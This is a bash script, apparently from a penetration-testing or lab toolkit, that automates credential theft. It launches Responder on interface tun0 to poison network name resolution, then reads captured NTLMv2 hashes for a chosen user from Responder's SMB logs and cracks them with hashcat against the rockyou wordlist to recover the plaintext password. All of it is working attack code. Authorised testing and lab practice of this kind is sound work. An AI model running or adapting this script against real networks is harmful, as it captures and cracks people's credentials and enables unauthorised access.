#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
start_responder() {
    local responder_log="log/responder.log"
    if [ ! -z "$log_dir" ]; then
        responder_log="$log_dir/responder.log"
    fi
    if [[ -z "$responder_ip" ]]; then
        responder_ip=$(get_host_ip)
    fi
    if pgrep -f "responder -I tun0"; then
        echo "Responder is already running."
        return 1
    fi
    sudo python3 -u /usr/share/responder/Responder.py -I tun0 | tee >(remove_color_to_log >> $responder_log) 
}

stop_responder() {
    if pgrep -f "responder -I tun0"; then
        echo "Stopping Responder..."
        sudo pkill -f "responder -I tun0"
    else
        echo "No Responder is running."
    fi
}

get_responder_ntlm() {
    local user=$1
    local responder_txt="/usr/share/responder/logs/SMB-NTLMv2-SSP-$ip.txt"
    if [ -f "$responder_txt" ]; then
        ntlm_hash=$(cat "$responder_txt" | grep $user | tail -n 1)
        echo "NTLM hash found: $ntlm_hash for $user"
        echo "$ntlm_hash" > $user.hash
    fi   
}

get_ntlm_password(){
    local user=$1
    local password=""
    if [ -f "$user.hash" ]; then
        hashid $user.hash >> $trail_log
        hashcat --help | grep -i "ntlm" >> $trail_log
        hashcat -m 5600 $user.hash /usr/share/wordlists/rockyou.txt >> $trail_log
        local user_upper=${user^^}  
        password=$(hashcat --show $user.hash | grep $user_upper | awk -F ":" '{print $7}'  )
    fi
    echo "$password"
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then    
    project=$(pwd)
    source $SCRIPTDIR/general.sh
    source $SCRIPTDIR/network.sh
    if [[ "$1" == "stop" ]]; then
        stop_responder
        exit 0
    fi
    start_responder
fi